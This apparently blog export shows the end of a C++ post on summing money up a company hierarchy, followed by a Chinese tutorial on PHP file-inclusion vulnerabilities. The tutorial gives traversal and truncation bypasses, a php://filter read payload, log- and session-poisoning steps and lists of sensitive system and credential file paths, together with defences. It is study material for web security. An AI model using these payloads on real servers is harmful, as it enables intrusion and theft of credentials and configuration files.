<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> t:mp)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​	head.<span class="built_in">push_back</span>(t.first);</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">for</span>(<span class="keyword">auto</span> tem:mp)</span><br><span class="line"></span><br><span class="line">&#123;	</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tem.second.<span class="built_in">size</span>();i++)</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">if</span>(head.<span class="built_in">back</span>()==tem.second[i]) head.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里的head[0]应该就是boss了</p>
<p>然后关于计算我也有个map&lt;int,int&gt; mp2</p>
<p>这里就是遍历vector&lt;boss&gt; s，键为tem.boss，值为上交的钱((money&#x2F;100)*15);</p>
<p>mp2的结果就是</p>
<blockquote>
<p>0 30+30&#x3D;60</p>
<p>4 90</p>
</blockquote>
<p><strong>噢~，问题就出现在这里</strong></p>
<p>当时我的中期乃至后期思想是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	for(auto tem:mp2)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	if(tem.first==head[0])</span><br><span class="line">		result+=tem.second;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		result+=(tem.second/100)*15;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样得到了 0 60</p>
<p><strong>但是正确的逻辑应该是下面的</strong></p>
<p>4 90</p>
<p>而4 0 200</p>
<p>所以mp2的内容应该是</p>
<blockquote>
<p>0 30</p>
<p>4 90</p>
</blockquote>
<p>那么其实最终有</p>
<blockquote>
<p>4 290</p>
</blockquote>
<p>0收到的钱应该是30+(290&#x2F;100)*15&#x3D;60</p>
<p>。。。</p>
<p>怪不得，有多少用例答案是这样凑巧对的。</p>
<p>这样说的话，感觉可以套用第二题啊</p>
<p>等等</p>
<blockquote>
<p>0 4,5</p>
<p>4 1,2,3</p>
</blockquote>
<p>让我们这样分析一下，0公司收获了200+4公司的钱，而4公司收获了600，本身有200，则4公司有</p>
<p>所以0公司收获800&#x2F;100，嘶不对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct gongsi&#123;</span><br><span class="line"></span><br><span class="line">    int id;</span><br><span class="line">    int shangji;</span><br><span class="line">    int money;</span><br><span class="line">&#125;;</span><br><span class="line">map&lt;int,int&gt; mp1;</span><br><span class="line">map&lt;int,vector&lt;int&gt; &gt;mp2;</span><br><span class="line">void yingshe(vector&lt;gongsi&gt; gs)</span><br><span class="line">&#123;</span><br><span class="line">    //公司与钱</span><br><span class="line">    for(auto tem:gs)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;tem.id&lt;&lt;endl;</span><br><span class="line">        mp1[tem.id]=tem.money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //公司与子公司</span><br><span class="line">    for(auto tem:gs)</span><br><span class="line">    &#123;</span><br><span class="line">        mp2[tem.shangji].push_back(tem.id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;int&gt; head;//boss作为键，不会出现在值里</span><br><span class="line">void zhaoboss(map&lt;int,vector&lt;int&gt; &gt;mp2)</span><br><span class="line">&#123;</span><br><span class="line">    //题目限定 boss就一个</span><br><span class="line">    for(auto tem:mp2)</span><br><span class="line">    &#123;</span><br><span class="line">        head.push_back(tem.first);</span><br><span class="line"></span><br><span class="line">        for(auto tem1:mp2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(count(tem1.second.begin(),tem1.second.end(),head.back()))</span><br><span class="line">            head.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//难点在于从最子公司上交，是boss的直属子公司的话，那还要先等其子公司上交完了再说</span><br><span class="line">/*</span><br><span class="line">公司与子公司</span><br><span class="line">0 1</span><br><span class="line">1 2,3,4</span><br><span class="line">这种处理方法就是，将2,3,4上交给1的钱加起来</span><br><span class="line">再与1本身的钱相加做处理，再交给0，最终才是0所得</span><br><span class="line"></span><br><span class="line">所以是1的钱先暂时不交给0，等其子公司忙完再说</span><br><span class="line"></span><br><span class="line">那如果是</span><br><span class="line">0 1</span><br><span class="line">1 2,3,4</span><br><span class="line">4 5</span><br><span class="line"></span><br><span class="line">先等5交给4</span><br><span class="line">再等4本身的钱+5上交的钱 给1</span><br><span class="line">1本身的钱+2,3,4上交的钱，处理后，给0</span><br><span class="line"></span><br><span class="line">怎么搞</span><br><span class="line">关键是上级公司很多，下级公司也很多</span><br><span class="line">每个公司交钱，将自己的+下级公司上交的钱上交</span><br><span class="line">每个上级公司上交给自己的上级前，需要等待下级公司的上交</span><br><span class="line">作为上级公司，怎么知道自己下级公司交完了呢？</span><br><span class="line">1 2 3 4</span><br><span class="line">4 5</span><br><span class="line">*/</span><br><span class="line">map&lt;int,int&gt; mp3;</span><br><span class="line">int jisuan(map&lt;int,int&gt; mp1,map&lt;int,vector&lt;int&gt; &gt;mp2,int boss)</span><br><span class="line">&#123;</span><br><span class="line">    for(auto tem:mp2)//子公司对接名单咯</span><br><span class="line">    &#123;</span><br><span class="line">        //直系公司先不处理，就是直接上交给boss的</span><br><span class="line">        if(tem.first!=boss)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    vector&lt;gongsi&gt; gs;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        gongsi a;</span><br><span class="line">        cin&gt;&gt;a.id&gt;&gt;a.shangji&gt;&gt;a.money;</span><br><span class="line">        gs.push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    // for(auto a:gs)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;a.id&lt;&lt;a.shangji&lt;&lt;a.money&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    yingshe(gs);</span><br><span class="line"></span><br><span class="line">    // for(auto a:mp1)</span><br><span class="line">    // cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">    // for(auto a:mp2)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;a.first&lt;&lt;&quot; &quot;;</span><br><span class="line">    //   for(auto aa:a.second)</span><br><span class="line">    //   &#123;</span><br><span class="line">    //     cout&lt;&lt;aa&lt;&lt;&quot;,&quot;;</span><br><span class="line">    //   &#125;</span><br><span class="line">    //   cout&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    zhaoboss(mp2);</span><br><span class="line">    int boss=head[0];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="完善代码-1"><a href="#完善代码-1" class="headerlink" title="完善代码"></a>完善代码</h4><p>几天时间后，</p>
<p>思路：</p>
<blockquote>
<p>1.两个映射，map&lt;int,vector&lt;int&gt; &gt; mp1 记录公司与子公司</p>
<p>​	map&lt;int,int&gt; 记录公司与自己的钱，注意的是boss需要额外添加</p>
<p>2.找boss，没什么好说的，遍历mp1，如果键出现在了值里，它就不是boss</p>
<p>3.jisuan(mp1,mp2,id)，这个计算逻辑：</p>
<p> 如果有个底层公司直接归属于上级，直接上交</p>
<p>如果子公司还有子公司，那就遍历，直到子公司是底层为止</p>
<p>比如映射关系如下</p>
<p>0 4,5</p>
<p>4 1,2,3</p>
<p>先找到boss，从boss的子公司开始遍历，是4</p>
<p>那么，开始递归，4的子公司，1有没有子公司呢（mp1的键上有它没有）</p>
<p>没有，则直接交15%给4，修改mp2对应的值，同时将交钱的公司，金钱归0</p>
<p>2,3依次类推</p>
<p>5也可以上交，mp2[5]&#x3D;0;</p>
<p>最后mp2的情况就是</p>
<p>0 30</p>
<p>4 290</p>
<p>遍历mp2，如果是boss，直接加，如果不是boss，交15%</p>
</blockquote>
<p>哎，总结：</p>
<p>对于一个公司来说，其有一个底层公司，那就直接上交15%，但如果其子公司还有子公司，先不接收上交，</p>
<p>最后遍历的时候统一计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct gongsi&#123;</span><br><span class="line"></span><br><span class="line">    int id;</span><br><span class="line">    int shangji;</span><br><span class="line">    int money;</span><br><span class="line"> //   vector&lt;int&gt; xiaji;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;int&gt; head;</span><br><span class="line">map&lt;int,vector&lt;int&gt; &gt; mp1;//公司与子公司映射</span><br><span class="line">//void zhaoboss(map&lt;int,vector&lt;gongsi&gt; &gt; companies)//单纯把键存起来，即可能的boss</span><br><span class="line">map&lt;int,int&gt; mp2;//公司id与money映射</span><br><span class="line"></span><br><span class="line">void zhaoboss(map&lt;int,vector&lt;int&gt; &gt; mp1)</span><br><span class="line">&#123;</span><br><span class="line">    for(auto tem:mp1)//如果键出现在值里，不是boss</span><br><span class="line">    &#123;</span><br><span class="line">        head.push_back(tem.first);</span><br><span class="line">        for(auto zigs:tem.second)</span><br><span class="line">        &#123;</span><br><span class="line">            if(head.back()==zigs) head.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void jisuan1(map&lt;int,vector&lt;int&gt; &gt;mp1,map&lt;int,int&gt;&amp; mp2,int id)</span><br><span class="line">&#123;</span><br><span class="line">    if(mp1.count(id))</span><br><span class="line">    &#123;</span><br><span class="line">        for(auto zigs:mp1[id])</span><br><span class="line">        &#123;</span><br><span class="line">            jisuan1(mp1,mp2,zigs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        for(auto tem:mp1)</span><br><span class="line">        &#123;</span><br><span class="line">            if(count(tem.second.begin(),tem.second.end(),id))//底层公司</span><br><span class="line">            &#123;</span><br><span class="line">                  cout&lt;&lt;&quot;Change!&quot;&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;&quot;当前&quot;&lt;&lt;id&lt;&lt;&quot;是底层公司&quot;&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;&quot;上级是&quot;&lt;&lt;tem.first&lt;&lt;&quot;,&quot;&lt;&lt;mp2[tem.first]&lt;&lt;&quot;,&quot;&lt;&lt;mp2[id]&lt;&lt;endl;</span><br><span class="line">                mp2[tem.first]+=mp2[id]/100*15;</span><br><span class="line">                mp2[id]=0;</span><br><span class="line">                cout&lt;&lt;&quot;上交之后&quot;&lt;&lt;mp2[tem.first]&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">   // vector&lt;gongsi&gt; gs(n);</span><br><span class="line">  //  map&lt;int,vector&lt;gongsi&gt; &gt; company;//上级与下级映射</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        gongsi a;</span><br><span class="line">        cin&gt;&gt;a.id&gt;&gt;a.shangji&gt;&gt;a.money;</span><br><span class="line">        mp1[a.shangji].push_back(a.id);</span><br><span class="line">        mp2[a.id]=a.money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zhaoboss(mp1);</span><br><span class="line">      //boss是没有值的</span><br><span class="line">   // cout&lt;&lt;head[0]&lt;&lt;endl;</span><br><span class="line">   mp2[head[0]]=0;</span><br><span class="line">//    for(auto a:mp1)</span><br><span class="line">//    &#123;</span><br><span class="line">//     cout&lt;&lt;a.first&lt;&lt;&quot; &quot;;</span><br><span class="line">//     for(auto a1:a.second)</span><br><span class="line">//     &#123;</span><br><span class="line">//         cout&lt;&lt;a1&lt;&lt;&quot;,&quot;;</span><br><span class="line">//     &#125;</span><br><span class="line">//     cout&lt;&lt;endl;</span><br><span class="line">//    &#125;</span><br><span class="line">   for(auto a:mp2)</span><br><span class="line">    cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">    jisuan1(mp1,mp2,head[0]);</span><br><span class="line">    // for(auto a:company)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;a.first&lt;&lt;&quot; &quot;;</span><br><span class="line">    //     for(auto a1:a.second)</span><br><span class="line">    //         cout&lt;&lt;a1.id&lt;&lt;&quot;(&quot;&lt;&lt;a1.money&lt;&lt;&quot;),&quot;;</span><br><span class="line"></span><br><span class="line">    //     cout&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    for(auto a:mp2)</span><br><span class="line">    cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">   //cout&lt;&lt;head[0]&lt;&lt;&quot;,&quot;&lt;&lt;jisuan(company,head[0]);</span><br><span class="line">    </span><br><span class="line">    int result=0;</span><br><span class="line">    for(auto a:mp2)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a.first==head[0])</span><br><span class="line">        result+=a.second;</span><br><span class="line">        else result+=(a.second/100)*15;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    cout&lt;&lt;head[0]&lt;&lt;&quot;,&quot;&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一个例子</p>
<blockquote>
<p>5<br>1 0 200<br>2 1 200<br>3 1 200<br>4 1 200<br>5 4 200</p>
<p>0,0<br>1,200<br>2,200<br>3,200<br>4,200<br>5,200</p>
<p>（我打印一下公司的映射关系）</p>
<p>0 1</p>
<p>1 2,3,4</p>
<p>4 5</p>
<p>(从boss开始，0)</p>
<p>Change!<br>当前2是底层公司<br>上级是1,200,200<br>上交之后230<br>Change!<br>当前3是底层公司<br>上级是1,230,200<br>上交之后260<br>Change!<br>当前5是底层公司<br>上级是4,200,200<br>上交之后230<br>0,0<br>1,260<br>2,0<br>3,0<br>4,230<br>5,0</p>
<p>最终输出：0,60</p>
</blockquote>
]]></content>
      <categories>
        <category>力扣</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2023/06/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>在编写含有大量交互功能的站点时，为了实现单一文件在不同页面的重复使用，通常利用文件包含的方式，将本地可被复用的文件利用包含函数在当前页面中执行。</p>
<p>如果某个页面具有这种功能，并且在这个包含的过程中，<strong>被包含的文件名可通过参数的方式被用户端控制</strong>，那么就可能存在文件包含漏洞。</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件包含漏洞是指当PHP函数引入文件时，没有合理校验传入的文件名，从而<strong>操作了预想之外的文件</strong>，导致意外的文件泄露甚至恶意的代码注入。PHP文件包含漏洞根据包含的内容来源分为<strong>本地</strong>文件包含漏洞（LFI）和<strong>远程</strong>文件包含漏洞（RFI）。文件包含漏洞在利用时能够打开并包含本地文件并可利用此类漏洞查看系统任意文件内容，如果具备一些条件，也可以执行命令。</p>
<p>在PHP环境下，可利用include、require、include_once、require_once函数调用文件，实现文件包含的效果。一般情况下，均会利用include实现对配置、通用函数的加载，实现代码的复用，并且可使站点的结构非常清晰。但在部分情况下会利用包含函数实现对特定文件的包含，如用户上传的文件需展示等。在这种情况下，包含函数所引用的文件地点及类型可被用户控制，从而产生了文件包含攻击的可能性。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>严格来说，文件包含漏洞是代码注入的一种，其原理就是<strong>注入一段用户能控制的脚本或代码，并让服务器端以某种方式执行用户传入参数。</strong>这就导致文件包含漏洞可被利用的一种方式为<strong>Web木马利用各种方式部署在服务器上</strong>，并且<strong>木马文件或源码可被攻击者利用包含函数打开</strong>，导致Web木马被执行，从而使攻击成功。</p>
<h2 id="条件利用"><a href="#条件利用" class="headerlink" title="条件利用"></a>条件利用</h2><p>攻击者要想成功利用文件包含漏洞进行攻击，必须要满足以下两个条件，才称得上存在文件包含漏洞：</p>
<p>1）Web应用采用include（）等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入。</p>
<p>2）用户能够控制包含文件的参数，且被包含的文件路径可被当前页面访问。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>文件包含特点就是将服务器上的文件包含到当前的页面中。</p>
<p>因此，在利用方式上，重点需对可包含的文件进行分析，同时漏洞的危害由<strong>被包含文件</strong>的作用而决定。</p>
<h2 id="上传文件包含"><a href="#上传文件包含" class="headerlink" title="上传文件包含"></a>上传文件包含</h2><p>如果用户上传的文件内容中包含PHP代码，但无法直接执行，如果存在文件包含漏洞，就可以将代码由包含函数加载，执行代码。</p>
<p>当然，这取决于文件上传功能的设计：攻击者需知道<strong>上传文件存放的物理路径</strong>，还需要对<strong>上传文件所在的目录有执行权限</strong>。以上条件缺一不可，并且还需有<strong>文件包含的漏洞存在</strong>。</p>
<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。</p>
<p>1.首先通过包含等各种方式获取日志文件位置。需要知道当前中间件存储错误日志的路径。</p>
<p>2.在URL中插入执行代码，将其记录进日志文件。注意，此处代码被转义。假设此处提交include_0.php？&lt;？php phpinfo（）；？&gt;.php时，在&lt;？php后面紧跟着的空格，如果被转义成%20，就会导致php代码执行失败。有时候，写进access.log文件里的还可能是将两个尖括号&lt;&gt;也转义了的。在实际测试中，用火狐、高版本IE浏览器都会转义，但是使用IE6不会转义。也可以使用Burpsuit抓包做修改，</p>
<p>**嘶，这一块没有代码，不好实现，先放一放。（什么日志文件会自动记录错误的url?**）</p>
<p>3.总之写进去了后，访问这个文件，就会出现phpinfo()的信息</p>
<p>常见敏感信息路径如下。</p>
<p>1.Windows系统</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\boot.ini                                  //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml                // IIS配置文件</span><br><span class="line">C:\windows\repair\sam                           //存储Windows系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini                   // MySQL配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\usr.MYD       // MySQL root</span><br><span class="line">C:\windows\php.ini                              // PHP配置信息</span><br><span class="line">C:\windows\my.ini                                       // MySQL配置信息</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<hr>
<p>2.UNIX&#x2F;Linux系统</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd </span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf                  // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf     //虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini                         // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf                              // Apache配置文件</span><br><span class="line">/etc/my.conf                                            // MySQL配置文件</span><br><span class="line">/proc/self/environ                                      // Linux下环境变量文件</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2><p>以Session文件包含为例，Session文件保存在服务器端，并且Session中保存着用户的敏感信息。利用的条件为攻击者必须能够控制部分Session文件的内容，Session文件一般存放在&#x2F;tmp&#x2F;、&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;、&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;等目录下，一般以sess_SESSIONID为名来保存。</p>
<p>首先，查找到Session文件并包含一次。可以通过Firefox的fire cookie插件查看当前Session值来找到文件名。</p>
<p>实际应用过程中，需要注意以下几点：</p>
<p>1）网站可能没有生成临时Session，而是以Cookie方式保存用户信息，或者根本就没有Session，但目前这种情况非常少见。</p>
<p>2）对于Session文件内容的控制，需要先通过包含查看当前Session的内容，看Session值中有没有可控的某个变量，比如URL中的变量值，或者当前用户名username。如果有的话，就可以通过修改可控变量值控制恶意代码写入Session文件。如果没有的话，可以考虑让服务器报错，有时候服务器会把报错信息写入用户的Session文件。这样就可以通过控制服务器使报错的语句将恶意代码写入Session。</p>
<h2 id="PHP封装协议包含"><a href="#PHP封装协议包含" class="headerlink" title="PHP封装协议包含"></a>PHP封装协议包含</h2><p>要求allow_url_fopen为设置为ON。在PHP5.2.0之后的版本中支持data：伪协议，可以很方便地执行代码。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617204352489.png"></p>
<h2 id="利用方式总结"><a href="#利用方式总结" class="headerlink" title="利用方式总结"></a>利用方式总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617204439781.png"></p>
<h2 id="防护手段及对应的绕过方式"><a href="#防护手段及对应的绕过方式" class="headerlink" title="防护手段及对应的绕过方式"></a>防护手段及对应的绕过方式</h2><p>文件包含漏洞在攻击方面会有两个关注点：<strong>包含目标文件内容合法性</strong>以及<strong>包含文件的路径</strong>。</p>
<p>针对<strong>文件内容合法性</strong>，更多的是要在<strong>各类上传及文件接口</strong>上做好对应的防护。</p>
<p>在文件包含漏洞的防护方面，更多的是针对包含文件的<strong>过程</strong>进行防护，防护手段主要分为<strong>对包含目标的参数过滤</strong>和<strong>中间件级安全配置</strong>两个方面。</p>
<p><code>php://filter/convert.base64-encode/resource=index</code></p>
<h3 id="1-文件名验证"><a href="#1-文件名验证" class="headerlink" title="1.文件名验证"></a>1.文件名验证</h3><p>包含文件验证是指对可包含文件名设置黑名单或白名单、文件后缀名固定等，效果非常类似于文件上传攻击中针对文件后缀名的防护方式，比如只允许后缀为jpg的文件包含等。针对文件名的防护方式思路非常清晰，即严格限定文件类型。</p>
<p>采取的方法主要为：</p>
<p>1）文件后缀名固定：在包含的文件名后加固定后缀，期望文件按预期目标解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;page&#x27;];</span><br><span class="line">    if($file)</span><br><span class="line">    &#123;</span><br><span class="line">        include (&quot;&quot;.$_GET[&#x27;page&#x27;].&quot;html&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2）文件名过滤：这里可以用白名单或黑名单过滤，使用switch或array限制可以包含的文件名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?PHP&gt;</span><br><span class="line">        $filename = explode (&#x27;.&#x27;$name)</span><br><span class="line">        switch($filename)</span><br><span class="line">        &#123;</span><br><span class="line">            case &#x27;jpg&#x27;;</span><br><span class="line">            case &#x27;png&#x27;;</span><br><span class="line">                include &#x27;$name&#x27;;</span><br><span class="line">            break;</span><br><span class="line">            default:</span><br><span class="line">                echo &quot;无效文件，请重新选择&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>类似于上传攻击中的文件白名单防护功能。</p>
<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>针对文件名验证的绕过方式嘞</p>
<p>一种方式是在<strong>文件后缀名处下手</strong>，根据中间件或操作系统的特性实现对原有防护规则的绕过。</p>
<blockquote>
<p>攻击者可以在文件名后放一个空字节的编码，从而绕过这样的文件类型的检查。例如，对于“..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00.jpg”，Web应用程序使用的API会允许字符串中包含空字符，当实际获取文件名时，则由系统的API直接截断，而解析为“..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini”，这是利用PHP5.3.4之前的%00截断特定实现的，在上传攻击中也有相关利用措施。</p>
</blockquote>
<blockquote>
<p>在类UNIX的系统中也可以使用URL编码的换行符，例如，对于“..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%0a.jpg”，如果文件系统获取含有换行符的文件名，会截断为”..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”。</p>
</blockquote>
<p>另一种方式是通过<strong>目录长度限制</strong>来截断。</p>
<blockquote>
<p>Windows下可利用256位截断，Linux下则需要4096位截断。可能会发生URL过长无法解析的问题，浏览器支持的URL长度一般都在10000以上，但是不同的中间件并不一定支持过长的URL，因此这种方法在Windows服务器环境下更容易成功（要求PHP版本小于5.2.8环境）。</p>
</blockquote>
<p>假如后台代码 <code>include($_GET[&#39;file&#39;].&#39;.txt&#39;);</code></p>
<p>若参数为?file&#x3D;phpinfo.php&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;……</p>
<p>通过&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;截断之后的.txt。</p>
<p>要注意的是，采用.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;填充还是&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.填充与之前目录长度的奇偶性有关。</p>
<h3 id="2-路径限制"><a href="#2-路径限制" class="headerlink" title="2.路径限制"></a>2.路径限制</h3><p>针对包含文件的目录进行合法性校验，也就是对包含的文件路径进行严格的限制。</p>
<p>针对包含文件的目录进行合法性校验，也就是对包含的文件路径进行严格的限制。</p>
<p>1）目录限制，在用户提交的变量前增加固定路径，限制用户可调用的目录范围。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php   //可设定只允许包含的文件目录</span><br><span class="line">    $file = $_GET[&#x27;page&#x27;];</span><br><span class="line">    if($file)</span><br><span class="line">    &#123;</span><br><span class="line">        include &#x27;/var/www/html&#x27;.$file;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2）目录回退符过滤，避免回退符生效导致路径变化。</p>
<p>目录回退符常用“&#x2F;”“.”等符号实现。因此，对用户输入的参数中的特殊字符进行过滤，即可避免出现目录回退的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function filter($str)</span><br><span class="line">    &#123;</span><br><span class="line">        $str=str_replace(&quot;..&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&quot;.&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&quot;/&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&quot;\\&quot;,&quot;&quot;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">    $file = $_GET[&#x27;page&#x27;];</span><br><span class="line">    $file = filter($file);</span><br><span class="line">    if($file)</span><br><span class="line">    &#123;</span><br><span class="line">        include $file;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h4><blockquote>
<p>在某些场景下，可通过某些特殊的符号（如“<del>”）来尝试绕过，如提交“image.php？name&#x3D;</del>&#x2F;..&#x2F;phpinfo”这样的代码。其中“~”就是尝试是否可直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录的效果。</p>
</blockquote>
<p>或者</p>
<blockquote>
<p>..&#x2F;..&#x2F;将当前目录进行回溯</p>
</blockquote>
<h3 id="3-中间件安全配置"><a href="#3-中间件安全配置" class="headerlink" title="3.中间件安全配置"></a>3.中间件安全配置</h3><p>主要思路是限制当前中间件所在用户的权限。推荐给Web服务器配置独立用户，只拥有访问本目录及使用中间件的权限，从而有效避免越权访问其他的文件。</p>
<p>以Apache中间件+PHP为例。</p>
<p>以下几点均可影响到文件包含功能的安全性。</p>
<p>·magic_quotes_gpc</p>
<blockquote>
<p>post、get、cookie过来的单引号（’）、双引号（”）、反斜线（\）与NULL字符应增加转义字符“\”。利用GPC过滤与SQL注入中的参数内容转义方法非常类似，都是让用户的传递参数意义发生变化。此项目在PHP5.4之后已弃用，也可根据实际业务特点自行编写转义脚本。</p>
</blockquote>
<p>·限制访问区域</p>
<blockquote>
<p>open_basedir可用来将用户访问文件的活动范围限制在指定的区域，此选项在php.ini中进行设置。同理，在apache配置文件中（httpd.conf），也可利用Directory、VirtualHost等进行类似的目录限制。在利用Apache做相应配置时需要注意，如果Apache开启了虚拟主机（VirtualHost），那么就会影响PHP.ini中的open_basedir的效果，因此需根据实际环境选择合适的范围限制方法。</p>
</blockquote>
<p>·设置访问权限</p>
<blockquote>
<p>主要思路是限制当前中间件所在用户的权限。推荐给Web服务器配置独立用户，只拥有访问本目录及使用中间件的权限，从而有效避免越权访问其他的文件。</p>
